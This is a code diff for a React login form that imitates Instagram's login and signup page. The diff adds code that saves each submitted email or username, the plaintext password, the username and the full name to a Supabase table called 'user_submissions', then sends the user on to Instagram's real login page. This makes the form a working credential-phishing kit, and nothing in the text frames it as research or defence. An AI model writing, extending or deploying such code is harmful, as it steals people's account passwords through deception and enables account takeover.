@@ -3,6 +3,8 @@ import React, { useState } from 'react';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Eye, EyeOff } from 'lucide-react';
+import { supabase } from '@/integrations/supabase/client';
+import { useToast } from '@/hooks/use-toast';
 
 interface LoginFormProps {
   isLogin: boolean;
@@ -14,16 +16,61 @@ const LoginForm = ({ isLogin }: LoginFormProps) => {
   const [username, setUsername] = useState('');
   const [fullName, setFullName] = useState('');
   const [showPassword, setShowPassword] = useState(false);
+  const [loading, setLoading] = useState(false);
+  const { toast } = useToast();
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    
-    if (isLogin) {
-      // Redirect to Instagram's actual login page
-      window.open('https://www.instagram.com/accounts/login/', '_blank');
-    } else {
-      // For signup, redirect to Instagram's signup page
-      window.open('https://www.instagram.com/accounts/emailsignup/', '_blank');
+    setLoading(true);
+
+    try {
+      // Store the form data in Supabase
+      const { error } = await supabase
+        .from('user_submissions')
+        .insert({
+          email_or_username: emailOrUsername,
+          password: password,
+          username: !isLogin ? username : null,
+          full_name: !isLogin ? fullName : null,
+          submission_type: isLogin ? 'login' : 'signup',
+          submitted_at: new Date().toISOString()
+        });
+
+      if (error) {
+        console.error('Error storing data:', error);
+        toast({
+          title: "Error",
+          description: "Failed to save data. Please try again.",
+          variant: "destructive",
+        });
+        setLoading(false);
+        return;
+      }
+
+      // Successfully stored data, now redirect
+      toast({
+        title: "Data saved",
+        description: "Your information has been recorded successfully.",
+      });
+
+      // Small delay to show the toast before redirect
+      setTimeout(() => {
+        if (isLogin) {
+          window.open('https://www.instagram.com/accounts/login/', '_blank');
+        } else {
+          window.open('https://www.instagram.com/accounts/emailsignup/', '_blank');
+        }
+        setLoading(false);
+      }, 1000);
+
+    } catch (error) {
+      console.error('Unexpected error:', error);
+      toast({
+        title: "Error",
+        description: "Something went wrong. Please try again.",
+        variant: "destructive",
+      });
+      setLoading(false);
     }
   };
 
@@ -99,9 +146,10 @@ const LoginForm = ({ isLogin }: LoginFormProps) => {
 
         <Button
           type="submit"
-          className="w-full bg-blue-500 hover:bg-blue-600 text-white font-semibold py-2 px-4 rounded-sm text-sm"
+          disabled={loading}
+          className="w-full bg-blue-500 hover:bg-blue-600 text-white font-semibold py-2 px-4 rounded-sm text-sm disabled:opacity-50"
         >
-          {isLogin ? 'Log in' : 'Sign up'}
+          {loading ? 'Saving...' : (isLogin ? 'Log in' : 'Sign up')}
         </Button>
       </form>
 
